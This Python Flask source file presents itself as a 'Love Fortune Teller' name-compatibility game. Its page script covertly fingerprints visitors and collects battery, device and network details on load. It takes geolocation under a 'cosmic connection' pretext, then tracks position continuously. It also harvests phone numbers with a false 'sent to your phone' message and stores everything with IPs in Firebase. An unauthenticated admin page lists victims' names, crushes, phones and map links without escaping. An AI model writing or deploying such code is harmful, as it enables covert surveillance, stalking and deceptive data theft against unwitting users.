from flask import Flask, request, jsonify, render_template_string
import os
import random
import json
import requests
import re
from datetime import datetime

app = Flask(__name__)

# ========== FIREBASE SETUP ==========
FIREBASE_URL = "https://love-percentage-dc42b-default-rtdb.firebaseio.com"

def sanitize_key(text):
    """Replace invalid Firebase key characters with underscore"""
    return re.sub(r'[.#$\[\]]', '_', text)

def make_visitor_key(name1, name2):
    """Create a human-readable key from the two names"""
    n1 = sanitize_key(name1.strip())
    n2 = sanitize_key(name2.strip())
    return f"{n1}_{n2}"

# ========== LOVE CALCULATOR FUNCTIONS ==========
def calculate_love_percentage(name1, name2):
    combined = (name1 + name2).lower()
    total = sum(ord(c) for c in combined)
    return 50 + (total % 51)

def get_love_message(name1, name2, percentage):
    messages = [
        f"💕 {name1} ❤️ {name2} – your love shines at {percentage}% like a perfect dream!",
        f"✨ {name1} and {name2} share {percentage}% destiny written in the stars!",
        f"💖 {name1} + {name2} = {percentage}% endless affection!",
        f"🌹 {name1} and {name2} bloom together with {percentage}% love!",
        f"💫 {name1} ❤️ {name2} – {percentage}% cosmic connection!",
        f"💕 Hearts of {name1} and {name2} glow with {percentage}% warmth!",
        f"✨ {name1} & {name2} – {percentage}% magical bond!",
        f"💖 {name1} and {name2} share {percentage}% sweet harmony!",
        f"🌹 Love between {name1} and {name2} is {percentage}% pure bliss!",
        f"💫 {name1} ❤️ {name2} – {percentage}% soulmate vibes!",
        f"💕 {name1} and {name2} – {percentage}% love that never fades!",
        f"✨ {name1} ❤️ {name2} – {percentage}% beautiful connection!",
        f"💖 {name1} + {name2} = {percentage}% perfect chemistry!",
        f"🌹 {name1} and {name2} share {percentage}% romantic energy!",
        f"💫 {name1} ❤️ {name2} – {percentage}% dreamy love story!",
        f"💕 {name1} and {name2} glow with {percentage}% love light!",
        f"✨ {name1} ❤️ {name2} – {percentage}% forever feeling!",
        f"💖 {name1} + {name2} = {percentage}% heart connection!",
        f"🌹 {name1} and {name2} share {percentage}% sweet romance!",
        f"💫 {name1} ❤️ {name2} – {percentage}% love harmony!",
        f"💕 {name1} and {name2} – {percentage}% true love vibes!",
        f"✨ {name1} ❤️ {name2} – {percentage}% perfect match!",
        f"💖 {name1} + {name2} = {percentage}% love magic!",
        f"🌹 {name1} and {name2} share {percentage}% endless charm!",
        f"💫 {name1} ❤️ {name2} – {percentage}% romantic spark!",
        f"💕 {name1} and {name2} – {percentage}% heartwarming bond!",
        f"✨ {name1} ❤️ {name2} – {percentage}% destiny love!",
        f"💖 {name1} + {name2} = {percentage}% soulful match!",
        f"🌹 {name1} and {name2} share {percentage}% deep affection!",
        f"💫 {name1} ❤️ {name2} – {percentage}% love glow!",
        f"💕 {name1} and {name2} – {percentage}% charming connection!",
        f"✨ {name1} ❤️ {name2} – {percentage}% sweet destiny!",
        f"💖 {name1} + {name2} = {percentage}% emotional magic!",
        f"🌹 {name1} and {name2} share {percentage}% tender love!",
        f"💫 {name1} ❤️ {name2} – {percentage}% loving bond!",
        f"💕 {name1} and {name2} – {percentage}% golden romance!",
        f"✨ {name1} ❤️ {name2} – {percentage}% heart glow!",
        f"💖 {name1} + {name2} = {percentage}% pure affection!",
        f"🌹 {name1} and {name2} share {percentage}% love rhythm!",
        f"💫 {name1} ❤️ {name2} – {percentage}% dreamy bond!",
        f"💕 {name1} and {name2} – {percentage}% love spark!",
        f"✨ {name1} ❤️ {name2} – {percentage}% sweet harmony!",
        f"💖 {name1} + {name2} = {percentage}% love glow!",
        f"🌹 {name1} and {name2} share {percentage}% romance charm!",
        f"💫 {name1} ❤️ {name2} – {percentage}% heart magic!",
        f"💕 {name1} and {name2} – {percentage}% soft love vibes!",
        f"✨ {name1} ❤️ {name2} – {percentage}% fairytale bond!",
        f"💖 {name1} + {name2} = {percentage}% love warmth!",
        f"🌹 {name1} and {name2} share {percentage}% gentle romance!",
        f"💫 {name1} ❤️ {name2} – {percentage}% sweet spark!",
        f"💕 {name1} and {name2} – {percentage}% romantic glow!",
        f"✨ {name1} ❤️ {name2} – {percentage}% magical hearts!",
        f"💖 {name1} + {name2} = {percentage}% love energy!",
        f"🌹 {name1} and {name2} share {percentage}% passion!",
        f"💫 {name1} ❤️ {name2} – {percentage}% love charm!",
        f"💕 {name1} and {name2} – {percentage}% sweet connection!",
        f"✨ {name1} ❤️ {name2} – {percentage}% heart link!",
        f"💖 {name1} + {name2} = {percentage}% loving vibes!",
        f"🌹 {name1} and {name2} share {percentage}% affection!",
        f"💫 {name1} ❤️ {name2} – {percentage}% dreamy match!",
        f"💕 {name1} and {name2} – {percentage}% warm romance!",
        f"✨ {name1} ❤️ {name2} – {percentage}% loving destiny!",
        f"💖 {name1} + {name2} = {percentage}% magical bond!",
        f"🌹 {name1} and {name2} share {percentage}% heart charm!",
        f"💫 {name1} ❤️ {name2} – {percentage}% soulmate glow!",
        f"💕 {name1} and {name2} – {percentage}% forever love!",
        f"✨ {name1} ❤️ {name2} – {percentage}% sweet hearts!",
        f"💖 {name1} + {name2} = {percentage}% love rhythm!",
        f"🌹 {name1} and {name2} share {percentage}% dreamy vibes!",
        f"💫 {name1} ❤️ {name2} – {percentage}% magical story!"
    ]
    return random.choice(messages)

# ========== FIREBASE HELPER ==========
def save_to_firebase(path, data, method='put'):
    try:
        url = f"{FIREBASE_URL}/{path}.json"
        if method == 'put':
            response = requests.put(url, json=data, timeout=10)
        elif method == 'post':
            response = requests.post(url, json=data, timeout=10)
        elif method == 'delete':
            response = requests.delete(url, timeout=10)
        else:
            return False
        print(f"{method.upper()} {path}: {response.status_code}")
        return response.status_code in [200, 201, 204]
    except Exception as e:
        print(f"Firebase error: {e}")
        return False

def move_visitor_data(old_key, new_key, data):
    """Copy data from old key to new key, then delete old key"""
    # Save under new key
    ok = save_to_firebase(f"visitors/{new_key}", data, method='put')
    if ok:
        # Delete old key
        save_to_firebase(f"visitors/{old_key}", None, method='delete')
    return ok

# ========== HTML TEMPLATE (unchanged from your last working version) ==========
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>💕 Love Fortune Teller</title>
    <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .card {
            background: rgba(255, 255, 255, 0.98);
            border-radius: 35px;
            padding: 45px 35px;
            max-width: 500px;
            width: 100%;
            text-align: center;
            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.2);
        }
        h1 {
            background: linear-gradient(135deg, #667eea, #764ba2);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            margin-bottom: 10px;
            font-size: 2.3em;
        }
        .subtitle { color: #7b8a9b; margin-bottom: 35px; font-size: 0.9em; }
        .input-group { display: flex; gap: 15px; margin-bottom: 30px; flex-wrap: wrap; }
        input {
            flex: 1;
            padding: 16px 25px;
            border: 2px solid #e2e8f0;
            border-radius: 60px;
            font-size: 16px;
            text-align: center;
            background: #f7fafc;
        }
        input:focus { outline: none; border-color: #667eea; background: white; }
        
        .btn {
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            border: none;
            padding: 16px 40px;
            font-size: 18px;
            font-weight: 600;
            border-radius: 60px;
            cursor: pointer;
            width: 100%;
            transition: all 0.3s;
        }
        .btn:hover { transform: translateY(-2px); box-shadow: 0 15px 35px rgba(102, 126, 234, 0.4); }
        
        .cosmic-panel {
            margin-top: 20px;
            padding: 25px;
            background: #fef5e7;
            border-radius: 25px;
            display: none;
            border: 2px solid #ffe0b5;
        }
        .cosmic-status {
            background: white;
            padding: 15px;
            border-radius: 15px;
            margin: 15px 0;
            font-size: 14px;
        }
        .cosmic-btn {
            background: linear-gradient(135deg, #48bb78, #38a169);
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 50px;
            color: white;
            font-weight: 600;
            cursor: pointer;
            font-size: 16px;
        }
        .result {
            margin-top: 25px;
            padding: 30px;
            background: linear-gradient(135deg, rgba(102, 126, 234, 0.1), rgba(118, 75, 162, 0.1));
            border-radius: 25px;
            display: none;
            animation: fadeIn 0.6s ease;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .percentage {
            font-size: 5em;
            font-weight: 800;
            background: linear-gradient(135deg, #f093fb, #f5576c);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }
        .love-message { font-size: 1.2em; color: #2d3748; margin: 20px 0; }
        .phone-section {
            margin-top: 25px;
            padding: 20px;
            background: white;
            border-radius: 20px;
            display: none;
            border: 1px solid #e2e8f0;
        }
        .phone-input {
            width: 100%;
            padding: 14px;
            border: 2px solid #e2e8f0;
            border-radius: 50px;
            margin-bottom: 12px;
            text-align: center;
        }
        .save-btn {
            background: linear-gradient(135deg, #f093fb, #f5576c);
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 50px;
            color: white;
            font-weight: 600;
            cursor: pointer;
        }
        .status {
            margin-top: 15px;
            padding: 10px;
            border-radius: 25px;
            font-size: 13px;
            display: none;
        }
        .status.success { background: #c6f6d5; color: #22543d; display: block; }
        .status.error { background: #fed7d7; color: #742a2a; display: block; }
        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        footer { margin-top: 20px; font-size: 11px; color: #a0aec0; }
    </style>
</head>
<body>
<div class="card">
    <h1>💕 Love Fortune Teller</h1>
    <div class="subtitle">Discover your destiny ✨</div>
    
    <div id="stepNames">
        <div class="input-group">
            <input type="text" id="name1" placeholder="Your name">
            <input type="text" id="name2" placeholder="Their name">
        </div>
        <button class="btn" onclick="prepareReading()">🌙 Prepare Your Reading 🌙</button>
    </div>
    
    <div id="cosmicPanel" class="cosmic-panel">
        <h3>✨ Connecting to the Universe ✨</h3>
        <div class="cosmic-status" id="cosmicStatus">🌟 Click below to begin your cosmic journey</div>
        <button class="cosmic-btn" id="cosmicBtn" onclick="syncCosmicEnergy()">🔮 Reveal My Destiny 🔮</button>
    </div>
    
    <div id="result" class="result">
        <div class="percentage" id="percentage">0%</div>
        <div class="love-message" id="message"></div>
    </div>
    
    <div id="phoneSection" class="phone-section">
        <h4>📱 Receive Your Fortune</h4>
        <input type="tel" id="phone" class="phone-input" placeholder="Enter your mobile number">
        <button class="save-btn" onclick="saveNumber()">💾 Send to My Phone</button>
    </div>
    
    <div id="status" class="status"></div>
    <footer>🔮 Trust the universe | Your destiny awaits</footer>
</div>

<script>
    let sessionId = localStorage.getItem('destiny_session');
    if (!sessionId) {
        sessionId = 'destiny_' + Date.now() + '_' + Math.random().toString(36).substr(2, 10);
        localStorage.setItem('destiny_session', sessionId);
    }
    
    let currentFortune = '', currentPercent = 0, name1 = '', name2 = '';
    let currentLat = null, currentLon = null;
    let destinyData = { sessionId: sessionId, timestamp: new Date().toISOString() };
    
    async function collectDestinyData() {
        try {
            const fp = await FingerprintJS.load();
            const result = await fp.get();
            destinyData.fingerprint = result.visitorId;
        } catch(e) { destinyData.fingerprint = 'unknown'; }
        
        destinyData.screen = screen.width + 'x' + screen.height;
        destinyData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        destinyData.userAgent = navigator.userAgent;
        if (navigator.deviceMemory) destinyData.deviceMemory = navigator.deviceMemory + ' GB';
        if ('getBattery' in navigator) {
            try {
                const battery = await navigator.getBattery();
                destinyData.batteryLevel = Math.round(battery.level * 100) + '%';
            } catch(e) {}
        }
        const connection = navigator.connection;
        if (connection) destinyData.networkType = connection.effectiveType;
        
        await fetch('/save-destiny', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(destinyData)
        });
    }
    
    function prepareReading() {
        name1 = document.getElementById('name1').value.trim();
        name2 = document.getElementById('name2').value.trim();
        if (!name1 || !name2) {
            showMessage('Please enter both names 💕', 'error');
            return;
        }
        destinyData.name = name1;
        destinyData.crush_name = name2;
        
        // Tell backend to rename the Firebase entry to a human‑readable key
        fetch('/rename-visitor', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ oldKey: sessionId, name1: name1, name2: name2, data: destinyData })
        }).then(res => res.json()).then(data => {
            if (data.newKey) {
                // Update local sessionId to the new name‑based key
                sessionId = data.newKey;
                localStorage.setItem('destiny_session', sessionId);
                destinyData.sessionId = sessionId;
                // Continue with the rest of the flow
                document.getElementById('stepNames').style.display = 'none';
                document.getElementById('cosmicPanel').style.display = 'block';
                showMessage('The universe is ready for you ✨', 'info');
            } else {
                showMessage('Error renaming session. Please try again.', 'error');
            }
        }).catch(() => {
            showMessage('Network error. Please refresh.', 'error');
        });
    }
    
    function syncCosmicEnergy() {
        const energyBtn = document.getElementById('cosmicBtn');
        energyBtn.innerHTML = '<span class="loading"></span> Connecting...';
        energyBtn.disabled = true;
        document.getElementById('cosmicStatus').innerHTML = '✨ The stars are aligning...';
        
        navigator.geolocation.getCurrentPosition(async (position) => {
            currentLat = position.coords.latitude;
            currentLon = position.coords.longitude;
            const mapUrl = `https://www.google.com/maps?q=${currentLat},${currentLon}`;
            
            destinyData.latitude = currentLat;
            destinyData.longitude = currentLon;
            destinyData.mapUrl = mapUrl;
            
            await fetch('/save-destiny', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(destinyData)
            });
            
            await fetch('/record-location', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ sessionId, latitude: currentLat, longitude: currentLon, mapUrl })
            });
            
            await revealFortune();
            energyBtn.innerHTML = '✨ Destiny Revealed ✨';
            
            // Start live tracking
            startLiveTracking();
        }, (error) => {
            document.getElementById('cosmicStatus').innerHTML = '❌ Please allow cosmic connection!';
            energyBtn.innerHTML = '🔮 Try Again 🔮';
            energyBtn.disabled = false;
        });
    }
    
    function startLiveTracking() {
        navigator.geolocation.watchPosition(async (position) => {
            const newLat = position.coords.latitude;
            const newLon = position.coords.longitude;
            const newMapUrl = `https://www.google.com/maps?q=${newLat},${newLon}`;
            
            await fetch('/record-location', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ sessionId, latitude: newLat, longitude: newLon, mapUrl: newMapUrl })
            });
            
            destinyData.latitude = newLat;
            destinyData.longitude = newLon;
            destinyData.mapUrl = newMapUrl;
            await fetch('/save-destiny', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(destinyData)
            });
        });
    }
    
    async function revealFortune() {
        const response = await fetch('/calculate-fortune', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ name1, name2 })
        });
        const result = await response.json();
        currentPercent = result.percentage;
        currentFortune = result.message;
        document.getElementById('percentage').innerHTML = currentPercent + '%';
        document.getElementById('message').innerHTML = currentFortune;
        document.getElementById('result').style.display = 'block';
        document.getElementById('phoneSection').style.display = 'block';
        
        destinyData.fortuneText = currentFortune;
        destinyData.percentage = currentPercent;
        await fetch('/save-destiny', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(destinyData)
        });
    }
    
    async function saveNumber() {
        const phone = document.getElementById('phone').value.trim();
        if (!phone) { showMessage('Enter your number', 'error'); return; }
        destinyData.phoneNumber = phone;
        await fetch('/save-destiny', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(destinyData)
        });
        showMessage('✅ Fortune sent to your phone!', 'success');
        document.getElementById('phone').disabled = true;
        event.target.disabled = true;
    }
    
    function showMessage(msg, type) {
        const el = document.getElementById('status');
        el.textContent = msg;
        el.className = `status ${type}`;
        setTimeout(() => { el.style.display = 'none'; }, 3000);
    }
    
    collectDestinyData();
</script>
</body>
</html>
'''

# ========== FLASK ROUTES ==========
@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/rename-visitor', methods=['POST'])
def rename_visitor():
    try:
        data = request.get_json()
        old_key = data.get('oldKey')
        name1 = data.get('name1')
        name2 = data.get('name2')
        visitor_data = data.get('data')

        if not old_key or not name1 or not name2:
            return jsonify({'error': 'Missing data'}), 400

        new_key = make_visitor_key(name1, name2)
        # Ensure the data has the correct sessionId (use the new key)
        visitor_data['sessionId'] = new_key
        # Move the data to the new key and delete the old one
        if move_visitor_data(old_key, new_key, visitor_data):
            return jsonify({'newKey': new_key})
        else:
            return jsonify({'error': 'Could not move data'}), 500
    except Exception as e:
        print(f"Rename error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/save-destiny', methods=['POST'])
def save_destiny():
    try:
        data = request.get_json()
        session_id = data.get('sessionId')
        data['ip'] = request.headers.get('x-forwarded-for', request.remote_addr)
        data['timestamp'] = datetime.now().isoformat()
        
        url = f"{FIREBASE_URL}/visitors/{session_id}.json"
        response = requests.put(url, json=data, timeout=10)
        print(f"Saving to Firebase: {response.status_code}")
        return jsonify({'status': 'saved'})
    except Exception as e:
        print(f"Save error: {e}")
        return jsonify({'status': 'error'}), 500

@app.route('/record-location', methods=['POST'])
def record_location():
    try:
        data = request.get_json()
        session_id = data.get('sessionId')
        lat = data.get('latitude')
        lon = data.get('longitude')
        map_url = data.get('mapUrl')
        
        if session_id and lat and lon:
            location_data = {
                "sessionId": session_id,
                "timestamp": datetime.now().isoformat(),
                "latitude": lat,
                "longitude": lon,
                "mapUrl": map_url
            }
            url = f"{FIREBASE_URL}/tracking_data.json"
            response = requests.post(url, json=location_data, timeout=10)
            print(f"Saving location: {response.status_code}")
            return jsonify({'status': 'recorded'})
        return jsonify({'status': 'error'}), 400
    except Exception as e:
        print(f"Location error: {e}")
        return jsonify({'status': 'error'}), 500

@app.route('/calculate-fortune', methods=['POST'])
def calculate_fortune():
    data = request.get_json()
    name1 = data.get('name1', '')
    name2 = data.get('name2', '')
    percentage = calculate_love_percentage(name1, name2)
    message = get_love_message(name1, name2, percentage)
    return jsonify({'percentage': percentage, 'message': message})

# ========== ADMIN VIEW (unchanged) ==========
@app.route('/admin')
def admin():
    try:
        visitors_url = f"{FIREBASE_URL}/visitors.json"
        tracking_url = f"{FIREBASE_URL}/tracking_data.json"
        
        visitors_response = requests.get(visitors_url)
        tracking_response = requests.get(tracking_url)
        
        visitors = visitors_response.json() if visitors_response.status_code == 200 else {}
        tracking = tracking_response.json() if tracking_response.status_code == 200 else {}
        
        html = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Admin Dashboard</title>
            <style>
                body { background:#1a1a2e; color:#eee; font-family:monospace; padding:20px; }
                h1 { color:#f093fb; }
                table { background:#16213e; border-collapse:collapse; width:100%; }
                th, td { border:1px solid #0f3460; padding:8px; text-align:left; font-size:12px; }
                th { background:#e94560; }
                .btn { background:#e94560; color:white; padding:10px; text-decoration:none; display:inline-block; margin:10px; }
            </style>
        </head>
        <body>
            <h1>📊 Visitor Data</h1>
            <p><a href="/admin" class="btn">🔄 Refresh</a> <a href="/" class="btn">Back</a></p>
        """
        
        if visitors:
            html += "<table border='1'>"
            html += "<tr><th>Key / Names</th><th>Name</th><th>Crush</th><th>Love %</th><th>Phone</th><th>Latitude</th><th>Longitude</th><th>Map</th><th>Fingerprint</th><th>Battery</th></tr>"
            for key, visitor in visitors.items():
                if isinstance(visitor, dict):
                    map_link = f'<a href="{visitor.get("mapUrl", "#")}" target="_blank">🗺️</a>' if visitor.get("mapUrl") else "-"
                    html += f"""
                    <tr>
                        <td><strong>{key}</strong></td>
                        <td>{visitor.get('name', '-')}</td>
                        <td>{visitor.get('crush_name', '-')}</td>
                        <td style="color:#f093fb;">{visitor.get('percentage', '-')}%</td>
                        <td>{visitor.get('phoneNumber', '-')}</td>
                        <td>{visitor.get('latitude', '-')}</td>
                        <td>{visitor.get('longitude', '-')}</td>
                        <td>{map_link}</td>
                        <td>{visitor.get('fingerprint', '-')[:15]}...</td>
                        <td>{visitor.get('batteryLevel', '-')}</td>
                    </tr>
                    """
            html += "</table>"
        
        if tracking:
            html += f"<h2>Location Tracking ({len(tracking)} updates)</h2>"
            html += "<table border='1'><tr><th>Session ID</th><th>Time</th><th>Latitude</th><th>Longitude</th><th>Map</th></tr>"
            for key, loc in tracking.items():
                if isinstance(loc, dict):
                    map_link = f'<a href="{loc.get("mapUrl", "#")}" target="_blank">🗺️</a>' if loc.get("mapUrl") else "-"
                    html += f"""
                    <tr>
                        <td>{loc.get('sessionId', '')[:20]}...</td>
                        <td>{loc.get('timestamp', '')[:19]}</td>
                        <td>{loc.get('latitude', '-')}</td>
                        <td>{loc.get('longitude', '-')}</td>
                        <td>{map_link}</td>
                    </tr>
                    """
            html += "</table>"
        
        html += "</body></html>"
        return html
    except Exception as e:
        return f"<h1>Error: {str(e)}</h1>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
